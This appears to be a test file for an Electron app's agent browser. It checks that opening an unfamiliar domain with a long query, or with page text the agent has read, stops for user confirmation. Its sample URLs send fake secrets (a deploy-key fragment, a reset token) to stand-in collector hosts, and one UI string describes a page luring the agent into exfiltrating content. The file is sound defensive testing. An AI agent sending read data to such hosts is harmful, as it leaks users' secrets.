// 內建瀏覽器外送檢查(複審 B-2,Wei 拍板):agent 要開這一輪沒出現過的網域,而且網址參數很長(>200)或夾帶讀過的頁面文字 → 先停,
// 請用戶確認(needs_user kind=confirm,跟「要登入 / 要送出」同一個請求卡與狀態列「等你操作」),按「仍要開啟」才放行一次。
//   1. policy.exfilRisk:正常新聞網址(含 utm)不擋;搜尋引擎不擋;陌生網域帶長參數擋;同一個長參數但網域這一輪出現過不擋;
//      參數值是讀過的頁面文字 → 擋;短參數不擋
//   2. 真 Electron(本機代理供應假網站):讀一頁 → 開陌生網域帶那頁的字 → 伺服器沒收到、wait 回 needs_user、發 need_user kind=confirm;
//      按「仍要開啟」(userDone open)→ 伺服器收到、分頁 ready;正常新聞網址直接開
//   3. 畫面:確認卡的標題 / 說明 / 「仍要開啟」;列訊息槽「要你確認」
// 跑法:node tests/check_shell_browser_exfil.js(找不到 Electron 只跑 1、3)
const path = require("path"), fs = require("fs"), os = require("os");
const SHELL = path.join(__dirname, "..", "shell");
const GATE = require("./_electron_gate");
const policy = require(path.join(SHELL, "browser", "policy.js"));
let red = 0; const ok = (n, c, d) => { console.log((c ? "PASS  " : "FAIL  ") + n + (c ? "" : "  " + JSON.stringify(d))); if (!c) red++; };

if (!process.versions.electron) {
  const E = new Set();
  const news = "https://www.coindesk.com/markets/2026/09/26/bitcoin-etf-flows-turn-positive?utm_source=twitter&utm_medium=social&utm_campaign=coindesk_main&utm_content=editorial&utm_term=organic";
  ok("正常新聞網址(帶 utm,query " + (new URL(news).search.length) + " 字)不擋", policy.exfilRisk(news, E, "") === null);
  ok("搜尋引擎的查詢網址不擋(再長都一樣)", policy.exfilRisk("https://www.google.com/search?q=" + "x".repeat(400), E, "") === null
    && policy.exfilRisk("https://html.duckduckgo.com/html/?q=" + "y".repeat(400), E, "") === null);
  const long = "https://collector.example/c?d=" + "a".repeat(210);
  ok("陌生網域帶長參數(>" + policy.EXFIL_TAIL_MAX + ")→ 擋", (policy.exfilRisk(long, E, "") || {}).reason === "long_query");
  ok("fragment 也算長度", (policy.exfilRisk("https://collector.example/#" + "b".repeat(210), E, "") || {}).reason === "long_query");
  ok("同一個網址,但網域這一輪出現過 → 不擋", policy.exfilRisk(long, new Set(["collector.example"]), "") === null);
  const page = "Your private repository settings: deploy key AAAAB3NzaC1yc2EAAAADAQABAAABgQDx9 used by the build server on port 22.";
  ok("參數值是這一輪讀過的頁面文字(夠長)→ 擋", (policy.exfilRisk("https://collector.example/c?t=" + encodeURIComponent("deploy key AAAAB3NzaC1yc2EAAAADAQABAAABgQDx9 used by"), E, page) || {}).reason === "page_text");
  ok("短參數碰巧是頁面上的字 → 不擋", policy.exfilRisk("https://news.example/a?topic=bitcoin", E, "bitcoin price today") === null);
  const brSrc = fs.readFileSync(path.join(SHELL, "renderer", "browser.js"), "utf8"), strings = fs.readFileSync(path.join(SHELL, "renderer", "strings.js"), "utf8");
  ok("畫面:列訊息槽「要確認網址」、確認卡標題 / 說明 / 「仍要開啟」;按下是放行一次(userDone open),不是接手",
    /x\.need\.kind === "confirm" \? "br\.need\.confirm"/.test(brSrc) && /confirm: "br\.ask\.confirm\.h"/.test(brSrc) && /confirm: t\("br\.ask\.p\.confirm"\)/.test(brSrc)
    && /if \(k === "confirm"\) me\.addEventListener\("click", \(\) => window\.blave\.browserUserDone\(x\.id, "open"\)\);/.test(brSrc)
    && /"br\.need\.confirm": "要確認網址"/.test(strings) && /"br\.need\.confirm": "Address check needed"/.test(strings) && /"br\.ask\.openAnyway": "仍要開啟"/.test(strings)
    && /"br\.ask\.p\.confirm": "agent 這一輪還沒去過這個網站，網址卻帶著一大段資料，可能是被網頁誘導把讀到的內容送出去。先看網址列，確定沒問題再開。"/.test(strings));
  // 確認態的網址列:顯示被擋下的那個網址(含 # 之後)、換警示三角(canon 第 3 條),而且不能編輯(不是這一頁的網址)
  {
    const cutF = (n) => { const i = brSrc.indexOf("function " + n + "("); return brSrc.slice(i, brSrc.indexOf("\n}\n", i) + 2); };
    const mkEl = (tag) => { const e = { tag, cls: "", kids: [], text: "", append(...k) { for (const x of k) this.kids.push(x); }, set className(v) { this.cls = v; }, get className() { return this.cls; }, set textContent(v) { this.text = v; }, get textContent() { return this.text + this.kids.map((k) => (typeof k === "string" ? k : k.textContent || "")).join(""); } }; return e; };
    const brEl = (tag, cls, text) => { const e = mkEl(tag); if (cls) e.className = cls; if (text != null) e.text = text; return e; };
    const brIcon = (n) => ({ icon: n, textContent: "" });
    const brAddr = new Function("brEl", "brIcon", "brReg", cutF("brAddr") + "; return brAddr;")(brEl, brIcon, (h) => h.split(".").slice(-2).join("."));
    const held = "https://collector.example/c?d=abc#secret-part";
    const box = brAddr(held, true, true);
    ok("確認態網址列:被擋下的網址全文(含 #)＋警示三角", /warn/.test(box.cls) && box.kids[0].icon === "warn" && box.textContent.includes("#secret-part") && box.textContent.includes("collector.example"), box.textContent);
    ok("接線:確認態用 need.url、不接可編輯網址列;need_user 帶 url", /const held = x\.need && x\.need\.kind === "confirm" && x\.need\.url;/.test(brSrc) && /if \(exp\.live && !held\) brAddrEditable\(url, x\.id\);/.test(brSrc) && /const url = held \? brAddr\(x\.need\.url, true, true\) : brAddr\(x\.url, x\.blocked\);/.test(brSrc)
      && /url: typeof ev\.url === "string" \? ev\.url : ""/.test(brSrc));
  }
  const bin = GATE.bin(SHELL);
  if (!bin) { process.exit(red ? 1 : 0); }
  const r = require("child_process").spawnSync(bin, [__filename], { stdio: "inherit", env: { ...process.env, ELECTRON_ENABLE_LOGGING: "" } });
  process.exit(red || r.status ? 1 : 0);
}

const electron = require("electron");
const { app, BrowserWindow, session } = electron;
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "blave-exfil-"));
app.setPath("userData", tmp);
const hits = [];
app.whenReady().then(async () => {
  const win = new BrowserWindow({ width: 1200, height: 800, show: false });
  await win.loadURL("data:text/html,<p>host</p>");
  const secret = "SECRET-TOKEN-" + "k".repeat(40);
  const srv = require("http").createServer((req, res) => {
    const u = new URL(req.url, "http://" + req.headers.host); hits.push(u.host + u.pathname + u.search);
    res.writeHead(200, { "content-type": "text/html" });
    if (u.host === "mail.test") return res.end(`<title>Inbox</title><article><h1>Inbox</h1><p>${"Hello there. ".repeat(30)}</p><p>Your reset code: ${secret}</p></article>`);
    res.end("<title>page " + u.pathname + "</title><article><p>" + "Normal article text. ".repeat(20) + "</p></article>");
  });
  srv.on("connect", (_req, sock) => sock.destroy());
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  const ses = session.fromPartition("persist:agent-browser");
  await ses.setProxy({ proxyRules: "http=127.0.0.1:" + srv.address().port, proxyBypassRules: "<-loopback>" });
  const sent = [];
  const realSend = win.webContents.send.bind(win.webContents);
  win.webContents.send = (ch, ev) => { if (ch === "browser-event") sent.push(ev); return realSend(ch, ev); };
  const B = require(path.join(SHELL, "browser")).createBrowser({ electron, stateDir: path.join(tmp, "snaps"), getWin: () => win, uiLang: () => "en", track: () => {}, version: "test" });
  await B.beginTurn(win, "desktop-exfil");
  const ctx = { live: () => true };
  const call = async (n, a) => JSON.parse((await B._call(n, a || {}, ctx)).content[0].text);

  let r = await call("browser_open", { url: "http://mail.test/inbox" }); await call("browser_wait", { tab: r.tab });
  r = await call("browser_read", { tab: "t1" });
  ok("讀了一頁(頁面上有一段秘密字串)", r.ok !== false && String(r.untrusted_content || "").includes(secret));
  r = await call("browser_open", { url: "http://collector.test/c?d=" + encodeURIComponent(secret) });
  const tab = r.tab;
  const w = await call("browser_wait", { tab });
  const st = w.tabs && w.tabs[0] && w.tabs[0].status;
  ok("開陌生網域、參數是讀到的字 → 伺服器沒收到、wait 回 needs_user", !hits.some((h) => h.startsWith("collector.test")) && st === "needs_user", { hits, st });
  const needEv = sent.filter((e) => e.type === "need_user").pop();
  ok("…發 need_user kind=confirm(跟要登入 / 要送出同一條請求卡管道),帶著被擋下的網址", needEv && needEv.kind === "confirm" && needEv.summary === "collector.test" && /^http:\/\/collector\.test\/c\?d=SECRET-TOKEN/.test(needEv.url || ""), needEv);
  B.userDone(B._tabs.byAlias(tab).id, "open");
  for (let i = 0; i < 30 && !hits.some((h) => h.startsWith("collector.test")); i++) await new Promise((res) => setTimeout(res, 100));
  ok("按「仍要開啟」→ 放行一次:伺服器收到、need_clear", hits.some((h) => h.startsWith("collector.test")) && sent.some((e) => e.type === "need_clear" && e.id === B._tabs.byAlias(tab).id));
  const before = hits.length;
  r = await call("browser_open", { url: "http://news.test/markets/2026/09/26/btc?utm_source=x&utm_medium=y&utm_campaign=z" });
  const w2 = await call("browser_wait", { tab: r.tab });
  ok("正常新聞網址直接開(不問)", w2.tabs[0].status === "ready" && hits.length > before, w2);
  r = await call("browser_open", { url: "http://collector.test/again?d=" + "z".repeat(240) });
  const w3 = await call("browser_wait", { tab: r.tab });
  ok("同一個網域這一輪已經出現過(用戶放行過)→ 不再問", w3.tabs[0].status === "ready", w3);
  console.log(red ? `\n${red} FAILED` : "\nALL PASS");
  app.exit(red ? 1 : 0);
});
